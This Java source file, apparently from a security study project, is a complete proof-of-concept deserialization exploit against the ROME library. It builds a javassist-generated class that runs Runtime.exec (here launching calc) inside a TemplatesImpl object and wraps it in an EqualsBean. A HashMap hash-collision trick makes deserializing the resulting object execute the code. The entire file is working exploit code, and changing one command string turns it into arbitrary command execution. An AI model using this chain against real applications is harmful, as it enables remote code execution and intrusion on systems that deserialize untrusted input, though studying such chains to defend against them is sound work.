package org.dili.rome;

import com.sun.syndication.feed.impl.EqualsBean;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

public class EqualsBeanExp {
    public static void main(String[] args) throws Exception{
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";

        // 创建恶意类
        ClassPool classPool = ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass ctClass = classPool.makeClass("cccc");
        ctClass.setSuperclass(classPool.get(AbstractTranslet));
        ctClass.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        byte[] bytes = ctClass.toBytecode();

        // 创建TemplatesImpl对象
        Object templateImpl = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();
        setFiled(templateImpl, "_bytecodes", new byte[][]{bytes});
        setFiled(templateImpl, "_name", "test");
        setFiled(templateImpl, "_tfactory", null);

        // 创建EqualsBean
        // EqualsBean equalsBean = new EqualsBean(Templates.class, templateImpl);
        //
        // HashMap hashMap = new HashMap();
        // hashMap.put(templateImpl, "111");
        // hashMap.put(equalsBean, "222");
        EqualsBean bean = new EqualsBean(String.class, "s");

        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy", bean);
        map1.put("zZ", templateImpl);
        map2.put("zZ", bean);
        map2.put("yy", templateImpl);
        HashSet table = new HashSet();
        table.add(map1);
        table.add(map2);

        setFiled(bean, "_beanClass", Templates.class);
        setFiled(bean, "_obj", templateImpl);
        // 序列化
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("JavaSec/out/EqualsBean.bin"));
        objectOutputStream.writeObject(table);
        objectOutputStream.close();

        // 反序列化
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("JavaSec/out/EqualsBean.bin"));
        objectInputStream.readObject();
        objectInputStream.close();
    }

    public static void setFiled(Object o, String fieldname, Object value) throws Exception {
        Field field = o.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(o, value);
    }
}